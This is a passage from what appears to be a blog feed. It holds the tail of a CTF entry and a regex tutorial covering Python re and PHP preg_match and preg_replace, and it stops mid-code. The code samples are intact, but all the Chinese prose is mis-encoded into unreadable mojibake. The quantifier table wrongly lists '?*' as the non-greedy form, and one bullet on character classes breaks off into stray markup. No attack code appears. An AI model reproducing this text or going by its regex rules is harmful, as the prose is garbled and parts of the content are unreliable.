ä¸ºç›®å½•æ²¡æœ‰ræƒé™</p><p>åˆ©ç”¨ä¸å®‰å…¨çš„é€’å½’åˆ›å»ºç›®å½•åˆ›å»ºä¸€ä¸ªæ–°ç›®å½•æ”¾è„šæœ¬å³å¯</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ­£åˆ™è¡¨è¾¾å¼</title>
    <link href="/2025/12/18/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2025/12/18/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>åœ¨å¾ˆå¤šé¢˜ç›®ä¸­éƒ½ç”¨åˆ°è¿‡æ­£åˆ™è¡¨è¾¾å¼ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½å€ŸåŠ©aiï¼Œæ²¡æœ‰å¥½å¥½å­¦ä¹ è¿‡ï¼Œæ•…å†™ç¯‡æ–‡ç« ç³»ç»Ÿå­¦ä¹ ä¸€ä¸‹</p><p>æ­£åˆ™è¡¨è¾¾å¼æ˜¯ä¸€ç§ç”¨äºåŒ¹é…å’Œæ“ä½œæ–‡æœ¬çš„å¼ºå¤§å·¥å…·ï¼Œå®ƒæ˜¯ç”±ä¸€ç³»åˆ—å­—ç¬¦å’Œç‰¹æ®Šå­—ç¬¦ç»„æˆçš„æ¨¡å¼ï¼Œç”¨äºæè¿°è¦åŒ¹é…çš„æ–‡æœ¬æ¨¡å¼ã€‚</p><p>æ³¨ï¼špythonéƒ¨åˆ†æ ¹æ®ã€Špythonç¼–ç¨‹å¿«é€Ÿä¸Šæ‰‹â€”â€”è®©ç¹çå·¥ä½œè‡ªåŠ¨åŒ–ã€‹æ€»ç»“ï¼Œphpéƒ¨åˆ†ç”±è±†åŒ…aiç”Ÿæˆ</p><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h3 id="ä¸€ä¸ªä¾‹å­"><a href="#ä¸€ä¸ªä¾‹å­" class="headerlink" title="ä¸€ä¸ªä¾‹å­"></a>ä¸€ä¸ªä¾‹å­</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;<span class="hljs-keyword">import</span> re<br>&gt;&gt;&gt;tel=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\d\d\d-\d\d\d-\d\d\d\d&#x27;</span>)<br>&gt;&gt;&gt;mo=tel.search(<span class="hljs-string">&#x27;my phone number is 415-555-4242&#x27;</span>)<br>&gt;&gt;&gt;mo.group()<br><span class="hljs-number">415</span>-<span class="hljs-number">555</span>-<span class="hljs-number">4242</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­râ€™â€™ç”¨äºä¼ å…¥åŸå§‹å­—ç¬¦ä¸²ï¼Œtelæ˜¯ä¸€ä¸ªregexå¯¹è±¡ï¼Œmoæ˜¯ä¸€ä¸ªmatchå¯¹è±¡</p><h3 id="åˆ©ç”¨æ‹¬å·åˆ†ç»„"><a href="#åˆ©ç”¨æ‹¬å·åˆ†ç»„" class="headerlink" title="åˆ©ç”¨æ‹¬å·åˆ†ç»„"></a>åˆ©ç”¨æ‹¬å·åˆ†ç»„</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;tel=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;(\d\d\d)-(\d\d\d-\d\d\d\d)&#x27;</span>)<br>&gt;&gt;&gt;mo=tel.search(<span class="hljs-string">&#x27;my phone number is 415-555-4242&#x27;</span>)<br>&gt;&gt;&gt;mo.group(<span class="hljs-number">1</span>)<br><span class="hljs-number">415</span><br>&gt;&gt;&gt;mo.group(<span class="hljs-number">0</span>)<br><span class="hljs-number">415</span>-<span class="hljs-number">555</span>-<span class="hljs-number">4242</span><br>&gt;&gt;&gt;mo.groups()<br>(<span class="hljs-string">&#x27;415&#x27;</span>,<span class="hljs-string">&#x27;555-4242&#x27;</span>)<br>&gt;&gt;&gt;a,b=mo.groups()<br>&gt;&gt;&gt;a<br>&gt;&gt;&gt;<span class="hljs-number">415</span><br></code></pre></td></tr></table></figure><h3 id="ç®¡é“ç¬¦åŒ¹é…å¤šä¸ªåˆ†ç»„"><a href="#ç®¡é“ç¬¦åŒ¹é…å¤šä¸ªåˆ†ç»„" class="headerlink" title="ç®¡é“ç¬¦åŒ¹é…å¤šä¸ªåˆ†ç»„"></a>ç®¡é“ç¬¦åŒ¹é…å¤šä¸ªåˆ†ç»„</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;tel=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;Batman|Tina&#x27;</span>)<br>&gt;&gt;&gt;tel=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;Bat(man|mobile)&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="å¯é€‰åŒ¹é…"><a href="#å¯é€‰åŒ¹é…" class="headerlink" title="å¯é€‰åŒ¹é…"></a>å¯é€‰åŒ¹é…</h3><table><thead><tr><th>ç¬¦å·</th><th>æ¬¡æ•°</th></tr></thead><tbody><tr><td>ï¼Ÿ</td><td>é›¶æ¬¡æˆ–ä¸€æ¬¡</td></tr><tr><td>*</td><td>ä»»æ„æ¬¡æ•°ï¼ˆåŒ…æ‹¬é›¶æ¬¡ï¼‰</td></tr><tr><td>+</td><td>ä¸€æ¬¡æˆ–å¤šæ¬¡</td></tr><tr><td>{}</td><td>ç‰¹å®šæ¬¡æ•°</td></tr><tr><td>?*</td><td><strong>0 æ¬¡æˆ–å¤šæ¬¡</strong>ï¼ˆéè´ªå©ªæ¨¡å¼ï¼šå°½å¯èƒ½å°‘åŒ¹é…ï¼‰</td></tr></tbody></table><h3 id="ç‰¹æ®Šå­—ç¬¦ç±»å…ƒå­—ç¬¦"><a href="#ç‰¹æ®Šå­—ç¬¦ç±»å…ƒå­—ç¬¦" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦ç±»å…ƒå­—ç¬¦"></a>ç‰¹æ®Šå­—ç¬¦ç±»å…ƒå­—ç¬¦</h3><ul><li><p>\d åŒ¹é…ä»»æ„æ•°å­—ï¼Œç­‰ä»·äº <code>[0-9]</code></p></li><li><p>\D åŒ¹é…ä»»æ„éæ•°å­—ï¼Œç­‰ä»·äº <code>[^0-9]</code></p></li><li><p>\w åŒ¹é…ä»»æ„å•è¯å­—ç¬¦(å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿)ï¼Œç­‰ä»·äº <code>[a-zA-Z0-9_]</code></p></li><li><p>\W åŒ¹é…ä»»æ„éå•è¯å­—ç¬¦ï¼Œç­‰ä»·äº <code>[^a-zA-Z0-9_]</code></p></li><li><p>\s åŒ¹é…ä»»æ„ç©ºç™½å­—ç¬¦(ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ç­‰)</p></li><li><p>\S åŒ¹é…ä»»æ„éç©ºç™½å­—ç¬¦</p></li></ul><h3 id="å­—ç¬¦ç±»å…ƒå­—ç¬¦"><a href="#å­—ç¬¦ç±»å…ƒå­—ç¬¦" class="headerlink" title="å­—ç¬¦ç±»å…ƒå­—ç¬¦"></a>å­—ç¬¦ç±»å…ƒå­—ç¬¦</h3><p><code>[]</code> (æ–¹æ‹¬å·)</p><ul><li>å®šä¹‰å­—ç¬¦é›†åˆï¼ŒåŒ¹é…å…¶ä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦</li><li>ç¤ºä¾‹ï¼š<code>[aeiou]</code> åŒ¹é…ä»»æ„ä¸€ä¸ªå…ƒéŸ³å­—æ¯</li></ul><p><code>[^]</code> (å¦å®šå­—ç¬¦ç±»)</p><ul><li>åŒ¹é…ä¸åœ¨æ–¹æ‹¬å·ä¸­çš„ä»»æ„å­—ç¬¦</li><li>ç¤ºä¾‹ï¼š<code>[^0-9]</code> åŒ¹é…ä»»æ„éæ•°å­—å­—ç¬¦</li></ul><p><code>-</code> (è¿å­—ç¬¦)</p><ul><li>åœ¨å­—ç¬¦ç±»ä¸­è¡¨ç¤ºèŒƒå›´</li><li>ç¤ºä¾‹ï¼š<code>[a-z]</code> åŒ¹é…ä»»æ„å°å†™å­—æ¯</li></ul><h3 id="åŸºæœ¬å…ƒå­—ç¬¦"><a href="#åŸºæœ¬å…ƒå­—ç¬¦" class="headerlink" title="åŸºæœ¬å…ƒå­—ç¬¦"></a>åŸºæœ¬å…ƒå­—ç¬¦</h3><p><code>.</code> (ç‚¹å·)</p><ul><li><p>åŒ¹é…é™¤æ¢è¡Œç¬¦(<code>\n</code>)å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦</p><p>ç¤ºä¾‹ï¼š<code>a.b</code> åŒ¹é… â€œaabâ€, â€œa1bâ€, â€œa bâ€ ç­‰</p></li></ul><p><code>^</code> (è„±å­—ç¬¦)</p><ul><li>åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®</li><li>ç¤ºä¾‹ï¼š<code>^abc</code> åŒ¹é…ä»¥ â€œabcâ€ å¼€å¤´çš„å­—ç¬¦ä¸²</li></ul><p><code>$</code> (ç¾å…ƒç¬¦)</p><ul><li>åŒ¹é…å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®</li><li>ç¤ºä¾‹ï¼š<code>xyz$</code> åŒ¹é…ä»¥ â€œxyzâ€ ç»“å°¾çš„å­—ç¬¦ä¸²</li></ul><p><code>\</code> (åæ–œæ )</p><ul><li>è½¬ä¹‰å­—ç¬¦ï¼Œä½¿åé¢çš„å­—ç¬¦å¤±å»ç‰¹æ®Šå«ä¹‰</li><li>ç¤ºä¾‹ï¼š<code>\.</code> åŒ¹é…å®é™…çš„ç‚¹å·è€Œä¸æ˜¯ä»»æ„å­—ç¬¦</li></ul><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>ä¸€ä¸ªä¾‹å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sys.*nb/is&#x27;</span>,<span class="hljs-variable">$xdmtql</span>)<br></code></pre></td></tr></table></figure><p>åœ¨æ­£åˆ™è¡¨è¾¾å¼&#x2F;sys.*nb&#x2F;isä¸­ï¼Œ&#x2F;&#x2F;æ˜¯å®šç•Œç¬¦ï¼Œï¼Œå…¶ä¸­ <code>i</code> è¡¨ç¤ºå¿½ç•¥å¤§å°å†™ï¼Œ<code>s</code> è¡¨ç¤ºå•è¡Œæ¨¡å¼ï¼ˆä½¿ <code>.</code> åŒ¹é…åŒ…æ‹¬æ¢è¡Œç¬¦åœ¨å†…çš„æ‰€æœ‰å­—ç¬¦ï¼‰ï¼Œé‚£ä¹ˆå®ƒå°±åŒ¹é…syså¼€å¤´nbç»“å°¾ä¸­é—´æœ‰ä»»æ„å­—ç¬¦çš„å­—ç¬¦ä¸²</p><h3 id="å®šç•Œç¬¦"><a href="#å®šç•Œç¬¦" class="headerlink" title="å®šç•Œç¬¦"></a>å®šç•Œç¬¦</h3><p>PHP ä¸­æ­£åˆ™è¡¨è¾¾å¼å¿…é¡»ç”¨å®šç•Œç¬¦åŒ…è£¹ï¼Œå¸¸ç”¨å®šç•Œç¬¦ä¸º <code>/</code>ï¼Œä¹Ÿå¯ä½¿ç”¨ <code>#</code>ã€<code>~</code> ç­‰ï¼ˆå½“è¡¨è¾¾å¼ä¸­åŒ…å« <code>/</code> æ—¶ï¼Œç”¨å…¶ä»–å®šç•Œç¬¦å¯é¿å…è½¬ä¹‰ï¼Œæ›´ç®€æ´ï¼‰ã€‚</p><p>ç¤ºä¾‹ï¼š<code>/abc/</code>ã€<code>#a/b/c#</code>ã€<code>~hello~</code></p><h3 id="æœ€å°åŒ¹é…å•ä½"><a href="#æœ€å°åŒ¹é…å•ä½" class="headerlink" title="æœ€å°åŒ¹é…å•ä½"></a>æœ€å°åŒ¹é…å•ä½</h3><ul><li>æ™®é€šå­—ç¬¦ï¼ša-zã€A-Zã€0-9 ç­‰ï¼ŒåŒ¹é…è‡ªèº«ã€‚ç¤ºä¾‹ï¼š<code>/test/</code> åŒ¹é…å­—ç¬¦ä¸²ä¸­çš„ â€œtestâ€ã€‚</li><li>ç‰¹æ®Šå­—ç¬¦ï¼šéœ€è½¬ä¹‰ï¼ˆåŠ  <code>\</code>ï¼‰ï¼Œå¦‚ <code>.</code>ã€<code>*</code>ã€<code>+</code>ã€<code>?</code>ã€<code>^</code>ã€<code>$</code>ã€<code>()</code>ã€<code>[]</code>ã€<code>&#123;&#125;</code> ç­‰ã€‚ç¤ºä¾‹ï¼š<code>/a\.b/</code> åŒ¹é… â€œa.bâ€ï¼Œè€Œé â€œaabâ€ã€â€acbâ€ ç­‰ã€‚</li><li>å…ƒå­—ç¬¦ï¼ˆé¢„å®šä¹‰åŸå­ï¼‰ï¼š        <ul><li><code>\d</code>ï¼šåŒ¹é…æ•°å­—ï¼Œç­‰ä»·äº [0-9]</li><li><code>\D</code>ï¼šåŒ¹é…éæ•°å­—ï¼Œç­‰ä»·äº [^0-9]</li><li><code>\w</code>ï¼šåŒ¹é…å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼Œç­‰ä»·äº [a-zA-Z0-9_]</li><li><code>\W</code>ï¼šåŒ¹é…éå­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼Œç­‰ä»·äº [^a-zA-Z0-9_]</li><li><code>\s</code>ï¼šåŒ¹é…ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ \tã€æ¢è¡Œç¬¦ \n ç­‰ï¼‰</li><li><code>\S</code>ï¼šåŒ¹é…éç©ºç™½å­—ç¬¦</li><li><code>\b</code>ï¼šå•è¯è¾¹ç•Œï¼ˆåŒ¹é…å•è¯å¼€å¤´æˆ–ç»“å°¾ï¼Œå¦‚ <code>\btest\b</code> åŒ¹é… â€œtestâ€ å•è¯ï¼Œä¸åŒ¹é… â€œtest123â€ æˆ– â€œ123testâ€ï¼‰</li><li><code>\B</code>ï¼šéå•è¯è¾¹ç•Œ</li></ul></li></ul><h3 id="é‡è¯ï¼ˆåŒ¹é…æ¬¡æ•°ï¼‰"><a href="#é‡è¯ï¼ˆåŒ¹é…æ¬¡æ•°ï¼‰" class="headerlink" title="é‡è¯ï¼ˆåŒ¹é…æ¬¡æ•°ï¼‰"></a>é‡è¯ï¼ˆåŒ¹é…æ¬¡æ•°ï¼‰</h3><ul><li><code>*</code>ï¼šåŒ¹é…å‰é¢çš„åŸå­ 0 æ¬¡æˆ–å¤šæ¬¡ï¼ˆè´ªå©ªåŒ¹é…ï¼‰ã€‚ç¤ºä¾‹ï¼š<code>/ab*c/</code> å¯åŒ¹é… â€œacâ€ã€â€abcâ€ã€â€abbcâ€ ç­‰ã€‚</li><li><code>+</code>ï¼šåŒ¹é…å‰é¢çš„åŸå­ 1 æ¬¡æˆ–å¤šæ¬¡ï¼ˆè´ªå©ªåŒ¹é…ï¼‰ã€‚ç¤ºä¾‹ï¼š<code>/ab+c/</code> å¯åŒ¹é… â€œabcâ€ã€â€abbcâ€ï¼Œä¸åŒ¹é… â€œacâ€ã€‚</li><li><code>?</code>ï¼šåŒ¹é…å‰é¢çš„åŸå­ 0 æ¬¡æˆ– 1 æ¬¡ï¼ˆè´ªå©ªåŒ¹é…ï¼‰ã€‚ç¤ºä¾‹ï¼š<code>/ab?c/</code> å¯åŒ¹é… â€œacâ€ã€â€abcâ€ã€‚</li><li><code>&#123;n&#125;</code>ï¼šåŒ¹é…å‰é¢çš„åŸå­æ°å¥½ n æ¬¡ã€‚ç¤ºä¾‹ï¼š<code>/ab&#123;3&#125;c/</code> åŒ¹é… â€œabbbcâ€ã€‚</li><li><code>&#123;n,&#125;</code>ï¼šåŒ¹é…å‰é¢çš„åŸå­è‡³å°‘ n æ¬¡ã€‚ç¤ºä¾‹ï¼š<code>/ab&#123;2,&#125;c/</code> å¯åŒ¹é… â€œabbcâ€ã€â€abbbcâ€ ç­‰ã€‚</li><li><code>&#123;n,m&#125;</code>ï¼šåŒ¹é…å‰é¢çš„åŸå­ n åˆ° m æ¬¡ï¼ˆn â‰¤ æ¬¡æ•° â‰¤ mï¼‰ã€‚ç¤ºä¾‹ï¼š<code>/ab&#123;1,3&#125;c/</code> å¯åŒ¹é… â€œabcâ€ã€â€abbcâ€ã€â€abbbcâ€ã€‚</li><li>éè´ªå©ªåŒ¹é…ï¼šåœ¨é‡è¯ååŠ  <code>?</code>ï¼Œå³ <code>*?</code>ã€<code>+?</code>ã€<code>??</code>ã€<code>&#123;n,m&#125;?</code>ï¼ŒåŒ¹é…å°½å¯èƒ½å°‘çš„æ¬¡æ•°ã€‚ç¤ºä¾‹ï¼š<code>/a.*?b/</code> åŒ¹é… â€œaabâ€ ä¸­çš„ â€œaabâ€ï¼ˆè´ªå©ªåŒ¹é… <code>a.*b</code> ä¼šåŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œè‹¥å­—ç¬¦ä¸²ä¸º â€œaababâ€ï¼‰ã€‚</li></ul><h3 id="è¾¹ç•Œç¬¦"><a href="#è¾¹ç•Œç¬¦" class="headerlink" title="è¾¹ç•Œç¬¦"></a>è¾¹ç•Œç¬¦</h3><ul><li><code>^</code>ï¼šåŒ¹é…å­—ç¬¦ä¸²å¼€å¤´ï¼ˆå¤šè¡Œæ¨¡å¼ä¸‹åŒ¹é…æ¯è¡Œå¼€å¤´ï¼‰ã€‚ç¤ºä¾‹ï¼š<code>/^test/</code> åŒ¹é… â€œtestabcâ€ï¼Œä¸åŒ¹é… â€œabctestâ€ã€‚</li><li><code>$</code>ï¼šåŒ¹é…å­—ç¬¦ä¸²ç»“å°¾ï¼ˆå¤šè¡Œæ¨¡å¼ä¸‹åŒ¹é…æ¯è¡Œç»“å°¾ï¼‰ã€‚ç¤ºä¾‹ï¼š<code>/test$/</code> åŒ¹é… â€œabctestâ€ï¼Œä¸åŒ¹é… â€œtestabcâ€ã€‚</li><li><code>^$</code>ï¼šåŒ¹é…ç©ºå­—ç¬¦ä¸²ï¼ˆæˆ–ä»…å«ç©ºç™½å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œéœ€ç»“åˆ <code>\s*</code>ï¼Œå³ <code>/^\s*$/</code>ï¼‰ã€‚</li></ul><h3 id="é€‰æ‹©ç¬¦ä¸åˆ†ç»„"><a href="#é€‰æ‹©ç¬¦ä¸åˆ†ç»„" class="headerlink" title="é€‰æ‹©ç¬¦ä¸åˆ†ç»„"></a>é€‰æ‹©ç¬¦ä¸åˆ†ç»„</h3><ul><li>é€‰æ‹©ç¬¦ <code>|</code>ï¼šåŒ¹é…å¤šä¸ªè¡¨è¾¾å¼ä¸­çš„ä¸€ä¸ªã€‚ç¤ºä¾‹ï¼š<code>/test|demo/</code> åŒ¹é… â€œtestâ€ æˆ– â€œdemoâ€ã€‚</li><li>åˆ†ç»„ <code>()</code>ï¼š        <ul><li>å°†å¤šä¸ªåŸå­è§†ä¸ºä¸€ä¸ªæ•´ä½“ã€‚ç¤ºä¾‹ï¼š<code>/(ab)+/</code> åŒ¹é… â€œabâ€ã€â€ababâ€ ç­‰ã€‚</li><li>æ•è·åˆ†ç»„ï¼šé»˜è®¤æ•è·åˆ†ç»„å†…å®¹ï¼Œå¯é€šè¿‡åå‘å¼•ç”¨ï¼ˆ<code>\1</code>ã€<code>\2</code>â€¦ï¼‰ä½¿ç”¨ã€‚ç¤ºä¾‹ï¼š<code>/(\w+)\s+\1/</code> åŒ¹é…é‡å¤çš„å•è¯ï¼Œå¦‚ â€œtest testâ€ï¼ˆ<code>\1</code> å¼•ç”¨ç¬¬ä¸€ä¸ªåˆ†ç»„åŒ¹é…çš„å†…å®¹ï¼‰ã€‚</li><li>éæ•è·åˆ†ç»„ï¼š<code>(?:è¡¨è¾¾å¼)</code>ï¼Œä»…åˆ†ç»„ä¸æ•è·ï¼Œæ— æ³•åå‘å¼•ç”¨ã€‚ç¤ºä¾‹ï¼š<code>/(?:ab)+/</code> åŒ¹é… â€œababâ€ï¼Œä½†ä¸èƒ½ç”¨ <code>\1</code> å¼•ç”¨ â€œabâ€ã€‚</li></ul></li></ul><h3 id="å­—ç¬¦ç±»"><a href="#å­—ç¬¦ç±»" class="headerlink" title="å­—ç¬¦ç±»"></a>å­—ç¬¦ç±»</h3><p>ç”¨ <code>[]</code> å®šä¹‰ï¼ŒåŒ¹é…å…¶ä¸­ä»»æ„ä¸€ä¸ªåŸå­ï¼Œå¯ç®€åŒ–åŸå­å†™æ³•ã€‚</p><ul><li>æ™®é€šå­—ç¬¦ç±»ï¼š<code>[abc]</code> åŒ¹é… â€œaâ€ã€â€bâ€ æˆ– â€œcâ€ï¼›<code>[a-z]</code> åŒ¹é…ä»»æ„å°å†™å­—æ¯ï¼›<code>[A-Z0-9]</code> åŒ¹é…ä»»æ„å¤§å†™å­—æ¯æˆ–æ•°å­—ã€‚</li><li>å¦å®šå­—ç¬¦ç±»ï¼š<code>[^abc]</code> åŒ¹é…é™¤ â€œaâ€ã€â€bâ€ã€â€câ€ å¤–çš„ä»»æ„å­—ç¬¦ã€‚</li><li>ç‰¹æ®Šè¯´æ˜ï¼š<code>[]</code> å†…éƒ¨éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦æ— éœ€è½¬ä¹‰ï¼Œå¦‚ &lt;code id&#x3D;â€118.â€ã€ï¼‰ã€â€-â€œï¼ˆä¸­é—´ï¼‰éœ€è½¬ä¹‰æˆ–ç‰¹æ®Šå¤„ç†ã€‚ç¤ºä¾‹ï¼š<code>[a\.b]</code> åŒ¹é… â€œaâ€ã€â€.â€ æˆ– â€œbâ€ï¼›<code>[a-b-c]</code> åŒ¹é… â€œaâ€ã€â€bâ€ã€â€câ€ æˆ– â€œ-â€œã€‚</li></ul><h3 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h3><h4 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h4><p>åŠŸèƒ½ï¼šæ‰§è¡Œä¸€æ¬¡æ­£åˆ™åŒ¹é…ï¼Œè¿”å›åŒ¹é…æ¬¡æ•°ï¼ˆ0 æ¬¡æˆ– 1 æ¬¡ï¼Œå› ä¸ºåªåŒ¹é…ä¸€æ¬¡ï¼‰ï¼Œä¸åŒ¹é…è¿”å› 0ï¼Œé”™è¯¯è¿”å› FALSEã€‚</p><p>è¯­æ³•ï¼š<code>int preg_match(string $pattern, string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]])</code></p><ul><li><code>$pattern</code>ï¼šæ­£åˆ™è¡¨è¾¾å¼ï¼ˆå¸¦å®šç•Œç¬¦ï¼‰ã€‚</li><li><code>$subject</code>ï¼šå¾…åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚</li><li><code>$matches</code>ï¼šå¯é€‰å‚æ•°ï¼Œå­˜å‚¨åŒ¹é…ç»“æœã€‚<code>$matches[0]</code> æ˜¯å®Œæ•´åŒ¹é…ç»“æœï¼Œ<code>$matches[1]</code>ã€<code>$matches[2]</code>â€¦ æ˜¯æ•è·åˆ†ç»„çš„ç»“æœã€‚</li><li><code>$flags</code>ï¼šå¯é€‰å‚æ•°ï¼Œå¸¸ç”¨ <code>PREG_OFFSET_CAPTURE</code>ï¼Œè¡¨ç¤ºåŒæ—¶è¿”å›åŒ¹é…ç»“æœçš„èµ·å§‹ä½ç½®ã€‚</li><li><code>$offset</code>ï¼šå¯é€‰å‚æ•°ï¼ŒæŒ‡å®šä» <code>$subject</code> çš„å“ªä¸ªä½ç½®å¼€å§‹åŒ¹é…ã€‚</li></ul><p>ç¤ºä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;Hello, PHP regex!&quot;</span>;<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;/PHP/&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$matches</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;åŒ¹é…æˆåŠŸï¼š&quot;</span> . <span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]; <span class="hljs-comment">// è¾“å‡ºï¼šåŒ¹é…æˆåŠŸï¼šPHP</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;åŒ¹é…å¤±è´¥&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>åŠŸèƒ½ï¼šæ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ï¼Œè¿”å›æ›¿æ¢åçš„å­—ç¬¦ä¸²ï¼Œè‹¥æ²¡æœ‰åŒ¹é…é¡¹åˆ™è¿”å›åŸå­—ç¬¦ä¸²ã€‚</p><p>è¯­æ³•ï¼š<code>mixed preg_replace(mixed $pattern, mixed $replacement, mixed $subject [, int $limit = -1 [, int &amp;$count ]])</code></p><ul><li><code>$pattern</code>ï¼šæ­£åˆ™è¡¨è¾¾å¼ï¼ˆå¯ä¼ å…¥æ•°ç»„ï¼Œå¤šä¸ªæ­£åˆ™ï¼‰ã€‚</li><li><code>$replacement</code>ï¼šæ›¿æ¢åçš„å†…å®¹ï¼ˆå¯ä¼ å…¥æ•°ç»„ï¼Œä¸ <code>$pattern</code> å¯¹åº”ï¼›å¯ä½¿ç”¨ <code>\1</code>ã€<code>\2</code>â€¦ å¼•ç”¨æ•è·åˆ†ç»„ï¼Œæˆ– <code>$1</code>ã€<code>$2</code>â€¦ï¼‰ã€‚</li><li><code>$subject</code>ï¼šå¾…æ›¿æ¢çš„å­—ç¬¦ä¸²ï¼ˆå¯ä¼ å…¥æ•°ç»„ï¼Œå¤šä¸ªå­—ç¬¦ä¸²ï¼‰ã€‚</li><li><code>$limit</code>ï¼šå¯é€‰å‚æ•°ï¼ŒæŒ‡å®šæœ€å¤§æ›¿æ¢æ¬¡æ•°ï¼Œé»˜è®¤ -1ï¼ˆæ— é™åˆ¶ï¼‰ã€‚</li><li><code>$count</code>ï¼šå¯é€‰å‚æ•°ï¼Œå­˜å‚¨å®é™…æ›¿æ¢çš„æ¬¡æ•°ã€‚</li></ul><p>ç¤ºä¾‹ 1ï¼šåŸºç¡€æ›¿æ¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;Hello, 2024! Hello, PHP!&quot;</span>;<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;/Hello/&quot;</span>;<br><span class="hljs-variable">$replacement</span> = <span class="hljs-string">&quot;Hi&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <span class="hljs-comment">// è¾“å‡ºï¼šHi, 2024! Hi, PHP!</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹ 2ï¼šå¼•ç”¨åˆ†ç»„æ›¿æ¢ï¼ˆæ ¼å¼åŒ–æ—¥æœŸï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;2024-05-20&quot;</span>;<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;/(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/&quot;</span>;<br><span class="hljs-variable">$replacement</span> = <span class="hljs-string">&quot;\2/\3/\1&quot;</span>; <span class="hljs-comment">// æˆ– &quot;$2/$3/$1&quot;</span><br><span class="hljs-variable">$result</span> = <span class="hljs-title 